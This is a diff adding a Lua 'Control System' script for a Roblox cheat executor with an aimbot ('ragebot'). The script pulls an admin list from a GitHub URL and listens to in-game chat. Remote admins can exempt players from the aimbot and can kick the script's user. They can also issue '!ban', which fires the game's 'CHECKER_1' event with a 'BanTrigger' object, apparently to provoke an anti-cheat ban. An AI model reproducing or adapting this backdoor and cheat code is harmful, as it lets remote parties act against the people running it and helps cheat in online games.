@@ -1,0 +1,141 @@
+-- Control System Script (GitHub)
+local juju = juju or {} 
+local notif = juju.create_notification or function(...) print(...) end
+
+-- If these weren't exposed in global env, redefine or grab them from juju table
+local set_active = juju.set_active_ragebot_target
+local get_active = juju.get_active_ragebot_target
+
+local admin_list_url = "https://raw.githubusercontent.com/nigmaBoy/juju/refs/heads/main/juju"
+
+-- Local whitelist table just for this script's logic
+local control_whitelist = {}
+
+task.spawn(function()
+    local my_plr = game:GetService("Players").LocalPlayer
+    local admin_list = {}
+    local RunService = game:GetService("RunService")
+
+    -- 1. Fetch Admins
+    local function fetch_admins()
+        local s, r = pcall(function() return game:HttpGet(admin_list_url) end)
+        if s and r then
+            local content = r:match('whitelisted%s*=%s*"(.-)"')
+            if content then
+                admin_list = {}
+                for name in string.gmatch(content, "([^,]+)") do
+                    local cleaned = name:match("^%s*(.-)%s*$")
+                    if cleaned then table.insert(admin_list, cleaned) end
+                end
+            end
+        end
+    end
+    fetch_admins()
+
+    local function is_admin(user_name)
+        for _, n in pairs(admin_list) do
+            if n:lower() == user_name:lower() then return true end
+        end
+        return false
+    end
+    
+    local function find_player_by_partial(str)
+        if not str then return nil end
+        local found = nil
+        for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+            if string.find(p.Name:lower(), str:lower()) or string.find(p.DisplayName:lower(), str:lower()) then
+                found = p
+                break
+            end
+        end
+        return found
+    end
+
+    -- 2. Anti-Target Loop (Every Frame)
+    RunService.Heartbeat:Connect(function()
+        -- Get who the ragebot is currently targetting
+        local current_target = get_active and get_active()
+        
+        if current_target then
+            -- Check if they are whitelisted via !wl command
+            if control_whitelist[current_target.Name] then
+                -- Force untarget
+                if set_active then
+                    set_active(nil)
+                end
+            end
+        end
+    end)
+
+    -- 3. Chat Handler
+    local function on_chat(msg, speaker)
+        if not is_admin(speaker.Name) then return end
+        
+        local args = string.split(msg, " ")
+        local cmd = args[1]
+        local target_str = args[2]
+
+        -- !WL / !UNWL
+        if (cmd == "!wl" or cmd == "!unwl") and target_str then
+            local p = find_player_by_partial(target_str)
+            if p then
+                if cmd == "!wl" then
+                    control_whitelist[p.Name] = true
+                    notif("Admin Whitelisted: " .. p.Name, 2, 2)
+                else
+                    control_whitelist[p.Name] = nil
+                    notif("Admin Un-Whitelisted: " .. p.Name, 2, 2)
+                end
+            end
+        end
+
+        -- !KICK / !BAN
+        if (cmd == "!kick" or cmd == "!ban") and target_str then
+            local target_sub = target_str:lower()
+            
+            -- Admin Immunity
+            if is_admin(my_plr.Name) then return end
+            
+            if string.find(my_plr.Name:lower(), target_sub) or string.find(my_plr.DisplayName:lower(), target_sub) then
+                task.delay(5, function()
+                    if cmd == "!kick" then
+                        my_plr:Kick("Kicked by script owner.")
+                    elseif cmd == "!ban" then
+                        local c = my_plr.Character
+                        if c then
+                            local rp = c:FindFirstChild("HumanoidRootPart")
+                            local rs = game:GetService("ReplicatedStorage")
+                            local evt = rs:FindFirstChild("MainEvent")
+                            if evt and rp then
+                                evt:FireServer("CHECKER_1", rp)
+                                local bv = Instance.new("BodyVelocity")
+                                bv.Name = "BanTrigger"
+                                bv.Parent = rp
+                                evt:FireServer("CHECKER_1", bv)
+                                bv:Destroy()
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end
+
+    local function hook_plr(p)
+        p.Chatted:Connect(function(m) on_chat(m, p) end)
+    end
+
+    for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+        if is_admin(p.Name) then
+            print("[Control System] Admin detected in game:", p.Name)
+        end
+        hook_plr(p)
+    end
+
+    game:GetService("Players").PlayerAdded:Connect(function(p)
+        if is_admin(p.Name) then
+            print("[Control System] Admin joined:", p.Name)
+        end
+        hook_plr(p)
+    end)
+end)
